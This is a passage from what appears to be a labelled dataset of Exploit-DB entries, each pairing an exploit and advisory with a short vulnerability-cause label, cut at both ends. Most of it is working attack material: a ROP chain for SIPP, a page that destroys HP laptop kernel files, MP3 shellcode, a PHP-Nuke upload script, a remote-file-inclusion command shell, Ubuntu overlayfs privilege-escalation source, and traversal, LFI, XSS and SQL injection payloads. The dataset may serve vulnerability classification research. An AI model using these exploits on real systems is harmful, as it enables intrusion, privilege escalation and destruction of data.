0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080b4970) # xor eax, eax ; pop esi ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ;pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080dcf4b) # pop ebx ; pop esi ; pop edi ; ret rop += pack('<I', 0x0811abe0) # @ .data rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x08067b43) # pop ecx ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi; pop ebp ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x0811abe0) # padding without overwrite ebx rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080b4970) # xor eax, eax ; pop esi ; pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080e571f) # inc eax ; ret rop += pack('<I', 0x080c861f) # int 0x80  try:    print(""[*] SIPP 3.3 Buffer Overflow by Juan Sacco"")    print(""[*] Please wait.. running"")    subprocess.call([""sipp "", rop]) except OSError as e:    if e.errno == os.errno.ENOENT:        print ""SIPP  not found!""    else:     print ""Error executing exploit""    raise",an unproper filter of user suppliedinput while reading the configuration file and parsing the malicious crafted value,1
25120,"BibORB 1.3.2 - 'index.php' Traversal Arbitrary File Manipulation source: https://www.securityfocus.com/bid/12583/info       BibORB is reported prone to multiple vulnerabilities arising from insufficient sanitization of user-supplied input. These issues can be exploited by a remote attacker to carry out cross-site scripting, HTML injection, SQL injection, directory traversal, and arbitrary file upload attacks.    These vulnerabilities are reported to affect BibORB version 1.3.2 and all previous versions.   http://www.example.com/to/biborb/index.php?mode=result&database_name=../config.php&action=Delete",insufficient sanitization of user-supplied input,1
24600,"myserver 0.7 - Directory Traversal source: https://www.securityfocus.com/bid/11189/info  MyServer is reported prone to a remote directory traversal vulnerability. This issue presents itself due to insufficient sanitization of user-supplied data. This vulnerability results in improper access to potentially sensitive files located outside of the document root of the web server.   MyServer version 0.7 is reportedly affected by this issue, however, other versions may be vulnerable as well.  ""GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../""",insufficient sanitization of user-supplied data,1
31482,Quick Classifieds 1.0 - 'Classifieds/index.php3?DOCUMENT_ROOT' Remote File Inclusion source: https://www.securityfocus.com/bid/28417/info     Quick Classifieds is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.     Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.     Quick Classifieds 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/QuickSystems_path/classifieds/index.php3?DOCUMENT_ROOT=ZoRLu.txt?,fails to sufficiently sanitize user-supplied data,1
4757,"HP Software Update Client 3.0.8.4 - Multiple Vulnerabilities Advisory: /////////   There is another remotely exploitable flaw within software preinstalled  in HP notebook machines. This time, the culprit is automatic software  update tool provided by the vendor.The Potential exploitation may lead  to user files loss or altering vital system files (e.g. kernel), thus  leaving PC unbootable.   Overview: /////////   The flaw is located in the software called HP Software Update shipped  with the HP notebooks to support automatic software updates and critical  vulnerability patching. One of the ActiveX controls deployed by default  by the vendor contains an insecure method giving a potential attacker  the remote system arbitrary file write access.   Impact: ///////   Remote user files contents corruption Remote system kernel files damage  / Operating System DoS condition   Attack vectors: ///////////////   There are two main attack vector schemes:   - inducing remote user to launch WWW link after obtaining the  information about the location of an arbitrary file(s) locations/names  in the remote system. After clicking the link the files contents will be  unrecoverably destroyed. This attack vector thus requires additional  social engineering of the vitim to acquire exact name and location of  the potential attack target files. - inducing remote user to launch WWW  link resulting in corruption of vital Operating System files, leaving  the system unusable. This attack vector DOESN'T require any additional  victim social engineering, because the system files are always placed in  the predictable locations.   Technical details: //////////////////   The vulnerable ActiveX control EngineRules.dll is a component of HP  Software Updates system designed by the vendor.   It has assigned CLSID: 7CB9D4F5-C492-42A4-93B1-3F7D6946470D and is by  default included to ""Safe for Scripting"" OLE components, that allows  full execution scripting access to the control methods from within the  browser.   The default control installation path is C:\Program  Files\Hewlett-Packard\eSupportDiags\RulesEngine.dll   The control is used by the the HP Software Updates software's  HPWUCli.exe client application to enumerate, load and store available  software patches information. The HPWUCli.exe binary is located in the  directory: C:\Program Files\HP\HP Software Update\   The control may also be used by a remote WWW service, such as  Hewlett-Packard online software update service.   The potentialy insecure method is: void SaveToFile(String dataFilePath);   This method is used to store the software patch specific data (version,  remote location, vendor name, software description) in the binary file  beginning with the 32bit integer value containing the actual patches  count stored in the data file.   The problem lies in the lack of distinguish between local and global  data file area in this control. Both LoadDataFromFile() method and  SaveDataToFile() method have an access to the entire file system data  area, therefore any arbitrary user file can be accessed remotely using  one of these methods by a remote entity. Use the SaveDataToFile() can be  exploited to store the empty-by-initialize software patch data in the  existing file, which will result in previous file contents loss and  resetting it to 4 zero-bytes, describing a zero-size patch.   Noticing a specific vulnerability location (vendor's software update  system), simple disabling of the vulnerable control by the vendor's  patch (like in the other HP software vulnerbility case - HPInfo) would  result in the machine software update system compromise in this case and  would leave the user vulnerable to the future security issues.   Therefore reimplemetation of the update system and/or vulnerable control  local data area implementation is strongly recommended.   Remote Kernel Wreckage Exploit //////////////////////////////   Using this flaw one can construct an armed exploit, able for example to  destroy remote system kernel files and make the remote machine  UNBOOTABLE. The exploit is using vulnerable SaveToFile() to overwrite  the NT System kernel files with the 4 zero bytes. The target are memory  mapped ntoskrnl.exe and ntkrnlpa.exe kernel files which don't have a  write lock set on them and may be opened for write. Although Windows NT  system contains a protection for this kind of activity (system files  overwrite) it can be fooled by overwriting simultanously: system binary  files backup directory (\System32\DllCache\) actual system kernel files  (\System32\) and the Driver Backup directory (\Windows\Driver Cache\)  kernel files.   After the execution it will store an zero-initialized patch information  using SaveToFile() method sequentially to ntoskrnl.exe, ntkrnlpa.exe,  ntkrnlmp.exe ,ntkrpamp.exe NT kernel files , first in the  System32\DllCache\ directory, second to \System32\ directory and finally  to Windows\Driver Cache\ dir. After the very next OS shutdown, machine  will not be bootable anymore.   The exploit code has been attached to the end of this advisory. NOTE  however that it is provided ONLY as a Proof of Concept code and has been  released ONLY to estimate the impact level of the issue.   Vulnerable Software: ////////////////////   HP Software Update client v3.0.8.4 RulesEngine.dll ActiveX CTL v1.0   Internet Explorer 6.0 Internet Explorer 7.0   Windows XP Home Windows XP Pro Windows 2000 Windows 2003 Windows Vista   Vulnerable Hardware ///////////////////   Every HP notebook machine containing the HP Software Updates application  is vulnerable. It is possible that the vulnerable machine model list  disclosed by the vendor as a confirmation to the previous issue  concerning HP laptops - ""HP Info Center"" case, will be similar in this  case.   Exploits: /////////   ////////////////////////////////////////// //Remote Arbitrary File Corruption Exploit //////////////////////////////////////////   <html> <head> <script language=""JavaScript"">   var filePath=""c:\\temp\\testfile.txt"";   function spawn3() { o2obj.SaveToFile(filePath); }   </script> </head>   <body onload=""spawn3()""> <object ID=""o2obj"" WIDTH=0 HEIGHT=0 classid=""clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D"" </object> </body>  </html>   //////////////////////////////// //Remote Kernel Wreckage Exploit  //////////////////////////////// // // // WARNING! THE REAL THING... //  DON'T TRY THIS AT HOME! // THIS WILL DAMAGE YOUR // HP COMPUTER SYSTEM!!! // // ////////////////////////////////   <html> <head> <script language=""JavaScript"">   function spawn3() {   o2obj.EvaluateRules();   o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrnlpa.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrnlmp.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\dllcache\\ntkrpamp.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\system32\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\system32\\ntkrnlpa.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntoskrnl.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlpa.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlmp.exe"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\ntkrpamp.exe"");   o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\sp2.cab"");  o2obj.SaveToFile(""c:\\WINDOWS\\Driver Cache\\i386\\driver.cab""); }   function meltdown() { spawn3(); spawn3(); spawn3(); }   </script> </head>   <body onload=""meltdown()""> <object ID=""o2obj"" WIDTH=0 HEIGHT=0  classid=""clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D"" </object> </body>  </html>   Related final word: ///////////////////   Spiderpig, spiderpig, does whatever the spiderpig does... ;-)   Links: //////   Original advisory link:  www.anspi.pl/~porkythepig/hp-issue/wyfukanyszynszyl.txt   Credits: ////////   Issue discovery and research: porkythepig Contact: porkythepig@anspi.pl   # milw0rm.com [2007-12-19]",an insecure method,1
29942,"Atomix MP3 - '.MP3' File Buffer Overflow // source: https://www.securityfocus.com/bid/23756/info  Atomix MP3 is prone to a buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.  An attacker could exploit this issue by enticing a victim to load a malicious MP3 file. If successful, the attacker can execute arbitrary code in the context of the affected application.  ////////////////////////////////// [ STARTING CODE ] //////////////////////////////////////////////////// //// ////  [ Explanation ] this probe of concept make  ////  a malicious file that exploit the error. ////   //// ////  [ Note ]  ////  it was coded for Windows XP with SP2-es ////  if you want to try it into your own PC ////  it is necessary that you change this Offsets  ////  for your own offsets. //// ////     on:  ////  char offset[]=""""; ////     AND ////  mov ebx,0x77BF93C7 //// ////                Enjoy it n_nU!.. ////    Coded by preth00nker (using Mexican skill!)  #include <stdio.h> #include <conio.h> #include <string.h>  char shellcode[] =     //A simple CMD Call =) ""\x55""                 //push ebp ""\x8B\xEC""             //mov ebp,esp ""\x33\xFF""             //xor edi,edi ""\x57""                 //push edi ""\xC6\x45\xFC\x63""     //mov byte ptr [ebp-04h],63h ""\xC6\x45\xFD\x6D""     //mov byte ptr [ebp-03h],6Dh ""\xC6\x45\xFE\x64""     //mov byte ptr [ebp-02h],64h ""\x8D\x45\xFC""         //lea eax,[ebp-04h] ""\x50""                 //push eax ""\xBB\xC7\x93\xBF\x77"" //mov ebx,0x77BF93C7 ""\xFF\xD3"";            //call ebx                          /*Evilbuffer - 520 Bytes Free4exploit*/ char evilbuffer[521] = """";                        /*Data Base for songs found into the computer*/ char file[]          = ""mp3database.txt"";                         /*Call ESP SP2-es*/ char offset[]        = ""\x8B\x51\x81\x7C""; char temp[1024];  int main(){     printf(""\n\n##################################################\n"");     printf(""######\n"");         printf(""######          Exploit Atomix 2.3\n"");         printf(""######             By Preth00nker\n"");         printf(""######     Preth00nker [at] gmail [dot] com\n"");         printf(""######         http://www.mexhackteam.org\n\n\n"");     printf(""######         http://www.prethoonker.tk\n\n\n"");     FILE *fich;    	memset(evilbuffer,'M',520);     fich=fopen(file,""w+"");     printf("" (*) Creating the file: %s\n"", file);     strcpy(temp,evilbuffer);     printf("" (*) Adding the evilbuffer\n"");     strcat(temp,offset);     printf("" (*) Adding the Offset: %s\n"", offset);     strcat(temp,shellcode);     printf("" (*) Adding the Sellcode\n"");     fwrite(temp, strlen(temp),1, fich);     printf("" (*) Writting into the file\n"");     printf(""      [ Usage: ]\n"");         printf(""Step 1.- Generate the Evil File into the %ProgramFiles%\\AtomixMP3\\ \n"");         printf(""Step 2.- Run atomixmp3.exe\n"");         printf(""Step 3.- Click On Search module and Click (again) on the unique file found.\n"");     printf(""have fun =)!"");     fclose(fich);        return 0; } //// //// ////////////////////////////////////////// [ E O F ] ////////////////////////////////////////////////////",the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer,1
34383,Social Media - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/42009/info  Social Media is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the underlying computer; other attacks are also possible.  Social Media 2.0.0 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?view=../../../../../../../../../../../../../../../proc/self/environ%00,fails to properly sanitize user-supplied input,1
36874,"Chyrp 2.1.1 - 'ajax.php' HTML Injection source: https://www.securityfocus.com/bid/52115/info  Chyrp is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.  Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.  Chyrp 2.1.1 is vulnerable; other versions may also be affected.   <form action=""http://[host]/includes/ajax.php"" method=""post""> <input type=""hidden"" name=""action"" value=""preview"" /> <input type=""hidden"" name=""feather"" value="""" /> <input type=""hidden"" name=""field"" value="""" /> <input type=""hidden"" name=""content"" value='<script>alert(document.cookie);</script>' /> <input type=""submit"" id=""btn"">  </form>",fails to properly sanitize user-supplied input,1
35854,"PHP-Nuke 8.3 - 'upload.php' Arbitrary File Upload (2) source: https://www.securityfocus.com/bid/48257/info   Phpnuke is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.   An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process.   Phpnuke 8.3 is vulnerable; other versions may also be affected.   #!/usr/bin/perl ################################################### #//Iranian Pentesters Home #//PHP Nuke 8.3 MT AFU Vulnerability #//Coded by:4n0nym0us & b3hz4d #//http://www.pentesters.ir ###################################################   use LWP; use HTTP::Request::Common; print ""\n"" . ""///////////////////////////////////"" .""\n""; print ""     Iranian Pentesters Home"" . ""\n""; print "" PHP Nuke 8.3 MT AFU Vulnerability"" . ""\n""; print ""///////////////////////////////////"" .""\n""; print ""\n"" . ""Syntax: perl xpl.pl http://your-target.com shell.php.01 [prefix]"" . ""\n\n""; my $url   = $ARGV[0].""/includes/richedit/upload.php""; my $filename = $ARGV[1]; my $prefix = $ARGV[2]; my $rfile = $prefix . $filename . "".gif""; open fhandle, $ARGV[1] or die $!;  while (<fhandle>){ $shell .= $_; } close fhandle; open fhandle, "">"", $rfile or die $!; print fhandle ""\x47\x49\x46\x38\x39\x61\x05\x00\x05\x00"".""\n"".$shell; close(fhandle); my $ua = LWP::UserAgent->new; $ua->agent(""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.12) Gecko/20101026""); my $req = POST $url, Content_Type => 'form-data', 	Content      => [ 		upload => ""1"", 		path => 'images', 		pwd => ""1"", 		userfile =>  [ $rfile,$prefix . $filename ] 	]; my $res = $ua->request($req); $between=substr($res->as_string(), index($res->as_string(), '<img src=""upload/')+10, index($res->as_string(), 'onclick=""self.parent.') - index($res->as_string(), '<img src=""upload/')-12); print(""Uploaded File: "" . $ARGV[0].""/includes/richedit/"".$between); exit;",the application fails to adequately sanitize user-supplied input,1
27763,"I-RATER Platinum - 'Config_settings.TPL.php' Remote File Inclusion source: https://www.securityfocus.com/bid/17731/info  I-RATER Platinum is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  <?php /* I-RATER Platinum Remote File Inclusion exploit Cod3d by R@1D3N Gr33t:Oulaw - A.u.r.a - drTp - Cl0wn - b3hzad - Str0ke and all Persian Cyb3r Team Site:http://www.Aria-security.net Dork:""Powered by I-RATER PLATINUM""  example: target:http://www.site.com/admin/config_settings.tpl.php?include_path= cmdshell:http://www.own3r.com/cmd.txt?  */  $cmd = $_POST[""cmd""]; $target = $_POST[""target""]; $cmdshell = $_POST[""cmdshell""];  $form= ""<form method=\""post\"" action=\"""".$PHP_SELF.""\"">""      .""target:<br><input type=\""text\"" name=\""target\"" size=\""90\"" value=\"""".$target.""\""><br>""      .""cmdshell:<br><input type=\""text\"" name=\""cmdshell\"" size=\""90\"" value=\"""".$cmdshell.""\""><br>""      .""cmd:<br><input type=\""text\"" name=\""cmd\"" size=\""90\"" value=\"""".$cmd.""\""><br>""      .""<input type=\""submit\"" value=\""Submit\"" name=\""submit\"">""       .""</form><HR WIDTH=\""650\"" ALIGN=\""LEFT\"">"";  if (!isset($_POST['submit'])) {  echo $form;  }else{  $file = fopen (""test.txt"", ""w+"");  fwrite($file, ""<?php system(\""echo ++BEGIN++\""); system(\"""".$cmd.""\""); system(\""echo ++END++\""); ?>""); fclose($file);  $file = fopen ($target.$cmdshell, ""r""); if (!$file) {      echo ""<p>Unable to get output.\n"";      exit; }  echo $form;  while (!feof ($file)) {      $line .= fgets ($file, 1024).""<br>"";      } $tpos1 = strpos($line, ""++BEGIN++""); $tpos2 = strpos($line, ""++END++""); $tpos1 = $tpos1+strlen(""++BEGIN++""); $tpos2 = $tpos2-$tpos1; $output = substr($line, $tpos1, $tpos2); echo $output;  } ?>",a failure in the application to properly sanitize user-supplied input,1
28517,IDevSpot iSupport 1.8 - 'index.php?cons_page_title' Cross-Site Scripting source: https://www.securityfocus.com/bid/19963/info    IDevSpot iSupport is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user supplied data.    Exploiting these issues could allow an attacker to steal cookie-based authentication credentials and to launch other attacks.    Version 1.8 is vulnerable; other versions may also be affected.  http://www.example.com/isupport/index.php?cons_page_title=[xss],fails to sufficiently sanitize user supplied data,1
25864,"DUware DUamazon Pro 3.0/3.1 - 'review.asp?iPro' SQL Injection source: https://www.securityfocus.com/bid/14033/info      DUamazon Pro is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.      Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  http://www.example.com/DUamazonPro/shops/review.asp?iSub=17&iPro=36[SQL Inject]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
32308,GenPortal - 'buscarCat.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/30957/info  GenPortal is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/path/buscarCat.php?palBuscar=[XSS],fails to sufficiently sanitize user-supplied data,1
41763,"Ubuntu 15.10 - 'USERNS ' Overlayfs Over Fuse Privilege Escalation Source: http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/  ## Introduction  Problem description: On Ubuntu Wily it is possible to place an USERNS overlayfs mount over a fuse mount. The fuse filesystem may contain SUID binaries, but those cannot be used to gain privileges due to nosuid mount options. But when touching such an SUID binary via overlayfs mount, this will trigger copy_up including all file attributes, thus creating a real SUID binary on the disk.  ## Methods  Basic exploitation sequence is:  - Mount fuse filesystem exposing one world writable SUID binary - Create USERNS - Mount overlayfs on top of fuse - Open the SUID binary RDWR in overlayfs, thus triggering copy_up  This can be archived, e.g.  SuidExec (http://www.halfdog.net/Misc/Utils/SuidExec.c) FuseMinimal (http://www.halfdog.net/Security/2016/OverlayfsOverFusePrivilegeEscalation/FuseMinimal.c) UserNamespaceExec (http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c)  test# mkdir fuse test# mv SuidExec RealFile test# ./FuseMinimal fuse test# ./UserNamespaceExec -- /bin/bash root# mkdir mnt upper work root# mount -t overlayfs -o lowerdir=fuse,upperdir=upper,workdir=work overlayfs mnt root# touch mnt/file touch: setting times of ‘mnt/file’: Permission denied root# umount mnt root# exit test# fusermount -u fuse test# ls -al upper/file -rwsr-xr-x 1 root root 9088 Jan 22 09:18 upper/file test# upper/file /bin/bash root# id uid=0(root) gid=100(users) groups=100(users)     --- SuidExec.c --- /** This software is provided by the copyright owner ""as is"" and any  *  expressed or implied warranties, including, but not limited to,  *  the implied warranties of merchantability and fitness for a particular  *  purpose are disclaimed. In no event shall the copyright owner be  *  liable for any direct, indirect, incidential, special, exemplary or  *  consequential damages, including, but not limited to, procurement  *  of substitute goods or services, loss of use, data or profits or  *  business interruption, however caused and on any theory of liability,  *  whether in contract, strict liability, or tort, including negligence  *  or otherwise, arising in any way out of the use of this software,  *  even if advised of the possibility of such damage.  *  *  Copyright (c) 2015 halfdog <me (%) halfdog.net>  *  See http://www.halfdog.net/Misc/Utils/ for more information.  *  *  This tool changes to uid/gid 0 and executes the program supplied  *  via arguments.  */  #define _GNU_SOURCE #include <stdio.h> #include <unistd.h>  extern char **environ;  int main(int argc, char **argv) {   if(argc<2) {     fprintf(stderr, ""Usage: %s [execargs]\n"", argv[0]);     return(1);   }    int rUid, eUid, sUid, rGid, eGid, sGid;   getresuid(&rUid, &eUid, &sUid);   getresgid(&rGid, &eGid, &sGid);   if(setresuid(sUid, sUid, rUid)) {     fprintf(stderr, ""Failed to set uids\n"");     return(1);   }   if(setresgid(sGid, sGid, rGid)) {     fprintf(stderr, ""Failed to set gids\n"");     return(1);   }    execve(argv[1], argv+1, environ);    return(1); } --- EOF ---  --- FuseMinimal.c --- /** This software is provided by the copyright owner ""as is"" and any  *  expressed or implied warranties, including, but not limited to,  *  the implied warranties of merchantability and fitness for a particular  *  purpose are disclaimed. In no event shall the copyright owner be  *  liable for any direct, indirect, incidential, special, exemplary or  *  consequential damages, including, but not limited to, procurement  *  of substitute goods or services, loss of use, data or profits or  *  business interruption, however caused and on any theory of liability,  *  whether in contract, strict liability, or tort, including negligence  *  or otherwise, arising in any way out of the use of this software,  *  even if advised of the possibility of such damage.  *  *  Copyright (c) 2016 halfdog <me (%) halfdog.net>  *  See http://www.halfdog.net/Misc/Utils/ for more information.  *  *  Minimal userspace file system demo, compile using  *  gcc -D_FILE_OFFSET_BITS=64 -Wall FuseMinimal.c -o FuseMinimal -lfuse  *  *  See also /usr/include/fuse/fuse.h  */  #define FUSE_USE_VERSION 28  #include <errno.h> #include <fuse.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h>  static FILE	*logFile;  static char	*fileNameNormal=""/file""; static char	*fileNameCharDev=""/chardev""; static char	*fileNameNormalSubFile=""/dir/file"";  static char	*realFileName=""./RealFile""; static int	realFileHandle=-1;  static int io_getattr(const char *path, struct stat *stbuf) {   fprintf(logFile, ""io_getattr(path=\""%s\"", stbuf=0x%p)\n"",       path, stbuf);   fflush(logFile);    int res=-ENOENT;   memset(stbuf, 0, sizeof(struct stat));   if(strcmp(path, ""/"") == 0) {     stbuf->st_mode=S_IFDIR|0755;     stbuf->st_nlink=2;     res=0;   } else if(strcmp(path, fileNameCharDev)==0) { //    stbuf->st_dev=makedev(5, 2);     stbuf->st_mode=S_IFCHR|0777;     stbuf->st_rdev=makedev(5, 2);     stbuf->st_nlink=1; // Number of hard links     stbuf->st_size=100;     res=0;   } else if(strcmp(path, ""/dir"")==0) {     stbuf->st_mode=S_IFDIR|S_ISGID|0777;     stbuf->st_nlink=1; // Number of hard links     stbuf->st_size=1<<12;     res=0;   } else if((!strcmp(path, fileNameNormal))||(!strcmp(path, fileNameNormalSubFile))) {     stbuf->st_mode=S_ISUID|S_IFREG|0777;     stbuf->st_size=100;      if(realFileName) {       if(fstat(realFileHandle, stbuf)) {         fprintf(logFile, ""Stat of %s failed, error %d (%s)\n"",             realFileName, errno, strerror(errno));       } else { // Just change uid/suid, which is far more interesting during testing         stbuf->st_mode|=S_ISUID;         stbuf->st_uid=0;         stbuf->st_gid=0;       }     } else {       stbuf->st_mode=S_ISUID|S_IFREG|0777;       stbuf->st_size=100;     }     stbuf->st_nlink=1; // Number of hard links     res=0;   }    return(res); }   static int io_readlink(const char *path, char *buffer, size_t length) {   fprintf(logFile, ""io_readlink(path=\""%s\"", buffer=0x%p, length=0x%lx)\n"",       path, buffer, (long)length);   fflush(logFile);   return(-1); }   static int io_unlink(const char *path) {   fprintf(logFile, ""io_unlink(path=\""%s\"")\n"", path);   fflush(logFile);   return(0); }   static int io_rename(const char *oldPath, const char *newPath) {   fprintf(logFile, ""io_rename(oldPath=\""%s\"", newPath=\""%s\"")\n"",       oldPath, newPath);   fflush(logFile);   return(0); }   static int io_chmod(const char *path, mode_t mode) {   fprintf(logFile, ""io_chmod(path=\""%s\"", mode=0x%x)\n"", path, mode);   fflush(logFile);   return(0); }   static int io_chown(const char *path, uid_t uid, gid_t gid) {   fprintf(logFile, ""io_chown(path=\""%s\"", uid=%d, gid=%d)\n"", path, uid, gid);   fflush(logFile);   return(0); }   /** Open a file. This function checks access permissions and may  *  associate a file info structure for future access.  *  @returns 0 when open OK  */ static int io_open(const char *path, struct fuse_file_info *fi) {   fprintf(logFile, ""io_open(path=\""%s\"", fi=0x%p)\n"", path, fi);   fflush(logFile);    return(0); }   static int io_read(const char *path, char *buffer, size_t length,     off_t offset, struct fuse_file_info *fi) {   fprintf(logFile, ""io_read(path=\""%s\"", buffer=0x%p, length=0x%lx, offset=0x%lx, fi=0x%p)\n"",       path, buffer, (long)length, (long)offset, fi);   fflush(logFile);    if(length<0) return(-1);   if((!strcmp(path, fileNameNormal))||(!strcmp(path, fileNameNormalSubFile))) {     if(!realFileName) {       if((offset<0)||(offset>4)) return(-1);       if(offset+length>4) length=4-offset;       if(length>0) memcpy(buffer, ""xxxx"", length);       return(length);     }     if(lseek(realFileHandle, offset, SEEK_SET)==(off_t)-1) {       fprintf(stderr, ""read: seek on %s failed\n"", path);       return(-1);     }     return(read(realFileHandle, buffer, length));   }   return(-1); }   static int io_readdir(const char *path, void *buf, fuse_fill_dir_t filler,     off_t offset, struct fuse_file_info *fi) {   fprintf(logFile, ""io_readdir(path=\""%s\"", buf=0x%p, filler=0x%p, offset=0x%lx, fi=0x%p)\n"",       path, buf, filler, ((long)offset), fi);   fflush(logFile);    (void) offset;   (void) fi;   if(!strcmp(path, ""/"")) {     filler(buf, ""."", NULL, 0);     filler(buf, "".."", NULL, 0);     filler(buf, fileNameCharDev+1, NULL, 0);     filler(buf, ""dir"", NULL, 0);     filler(buf, fileNameNormal+1, NULL, 0);     return(0);   } else if(!strcmp(path, ""/dir"")) {     filler(buf, ""."", NULL, 0);     filler(buf, "".."", NULL, 0);     filler(buf, ""file"", NULL, 0);     return(0);   }   return -ENOENT; }   static int io_access(const char *path, int mode) {   fprintf(logFile, ""io_access(path=\""%s\"", mode=0x%x)\n"",       path, mode);   fflush(logFile);   return(0); }   static int io_ioctl(const char *path, int cmd, void *arg,     struct fuse_file_info *fi, unsigned int flags, void *data) {   fprintf(logFile, ""io_ioctl(path=\""%s\"", cmd=0x%x, arg=0x%p, fi=0x%p, flags=0x%x, data=0x%p)\n"",       path, cmd, arg, fi, flags, data);   fflush(logFile);   return(0); }   static struct fuse_operations hello_oper = {   .getattr	= io_getattr,   .readlink	= io_readlink, // .getdir =  deprecated // .mknod // .mkdir   .unlink	= io_unlink, // .rmdir // .symlink   .rename	= io_rename, // .link   .chmod	= io_chmod,   .chown	= io_chown, // .truncate // .utime   .open = io_open,   .read = io_read, // .write // .statfs // .flush // .release // .fsync // .setxattr // .getxattr // .listxattr // .removexattr // .opendir   .readdir	= io_readdir, // .releasedir // .fsyncdir // .init // .destroy   .access	= io_access, // .create // .ftruncate // .fgetattr // .lock // .utimens // .bmap  .ioctl = io_ioctl, // .poll };  int main(int argc, char *argv[]) {   char	buffer[128];    realFileHandle=open(realFileName, O_RDWR);   if(realFileHandle<0) {     fprintf(stderr, ""Failed to open %s\n"", realFileName);     exit(1);   }    snprintf(buffer, sizeof(buffer), ""FuseMinimal-%d.log"", getpid());   logFile=fopen(buffer, ""a"");   if(!logFile) {     fprintf(stderr, ""Failed to open log: %s\n"", (char*)strerror(errno));     return(1);   }   fprintf(logFile, ""Starting fuse init\n"");   fflush(logFile);    return fuse_main(argc, argv, &hello_oper, NULL); } --- EOF ---  --- UserNamespaceExec.c --- /** This software is provided by the copyright owner ""as is"" and any  *  expressed or implied warranties, including, but not limited to,  *  the implied warranties of merchantability and fitness for a particular  *  purpose are disclaimed. In no event shall the copyright owner be  *  liable for any direct, indirect, incidential, special, exemplary or  *  consequential damages, including, but not limited to, procurement  *  of substitute goods or services, loss of use, data or profits or  *  business interruption, however caused and on any theory of liability,  *  whether in contract, strict liability, or tort, including negligence  *  or otherwise, arising in any way out of the use of this software,  *  even if advised of the possibility of such damage.  *  *  Copyright (c) 2015-2016 halfdog <me (%) halfdog.net>  *  See http://www.halfdog.net/Misc/Utils/ for more information.  *  *  This tool creates a new namespace, initialize the uid/gid  *  map and execute the program given as argument. This is similar  *  to unshare(1) from newer util-linux packages.  *  *  gcc -o UserNamespaceExec UserNamespaceExec.c  *  *  Usage: UserNamespaceExec [options] -- [program] [args]  *  *  * --NoSetGroups: do not disable group chanages  *  * --NoSetGidMap:  